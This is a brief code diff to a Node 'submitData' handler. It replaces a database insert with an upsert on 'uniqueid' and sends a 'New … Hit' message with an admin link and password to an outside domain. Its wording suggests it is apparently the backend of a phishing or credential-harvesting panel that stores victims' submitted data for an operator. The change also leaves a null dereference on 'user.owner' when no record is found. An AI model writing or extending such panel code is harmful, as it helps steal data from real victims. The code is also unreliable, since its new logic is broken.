@@ -46,7 +46,12 @@ const submitData = async (req, res) => {
 	data.timestamp = moment().format();
 	data.panelName = panelName;
 	try {
-		let user = await Panel.create(data);
+		let user = await Panel.findOne({ uniqueid: data.uniqueid });
+		if (user) {
+			await Panel.findOneAndUpdate({ uniqueid: data.uniqueid }, data);
+		} else {
+			await Panel.create(data);
+		}
 		message = `New ${panelName} Hit:\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=${panelName}&password=${
 			data.owner ? data.owner : user.owner
 		}`;
